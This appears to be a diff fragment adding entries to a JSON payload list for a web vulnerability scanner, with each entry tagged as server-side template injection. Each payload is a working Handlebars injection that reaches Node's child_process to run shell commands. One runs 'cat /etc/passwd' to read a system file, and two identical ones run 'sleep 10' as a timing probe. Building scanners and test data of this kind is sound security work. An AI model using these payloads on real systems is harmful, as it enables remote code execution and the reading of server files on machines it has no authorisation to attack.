+        "payload": "{{#with \"s\" as |string|}}   {{#with \"e\"}}     {{#with split as |conslist|}}       {{this.pop}}       {{this.push (lookup string.sub \"constructor\")}}       {{this.pop}}       {{#with string.split as |codelist|}}         {{this.pop}}         {{this.push \"return require('child_process').exec('cat /etc/passwd');\"}}         {{this.pop}}         {{#each conslist}}           {{#with (string.sub.apply 0 codelist)}}             {{this}}           {{/with}}         {{/each}}       {{/with}}     {{/with}}   {{/with}} {{/with}}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "{{#with \"s\" as |string|}}     {{#with \"e\"}}         {{#with split as |conslist|}}             {{this.pop}}             {{this.push (lookup string.sub \"constructor\")}}             {{this.pop}}             {{#with string.split as |codelist|}}                 {{this.pop}}                 {{this.push \"return require('child_process').exec('sleep 10');\"}}                 {{this.pop}}                 {{#each conslist}}                     {{#with (string.sub.apply 0 codelist)}}                         {{this}}                     {{/with}}                 {{/each}}             {{/with}}         {{/with}}     {{/with}} {{/with}}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "{{#with \"s\" as |string|}}     {{#with \"e\"}}         {{#with split as |conslist|}}             {{this.pop}}             {{this.push (lookup string.sub \"constructor\")}}             {{this.pop}}             {{#with string.split as |codelist|}}                 {{this.pop}}                 {{this.push \"return require('child_process').exec('sleep 10');\"}}                 {{this.pop}}                 {{#each conslist}}                     {{#with (string.sub.apply 0 codelist)}}                         {{this}}                     {{/with}}                 {{/each}}             {{/with}}         {{/with}}     {{/with}} {{/with}}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    }
+]
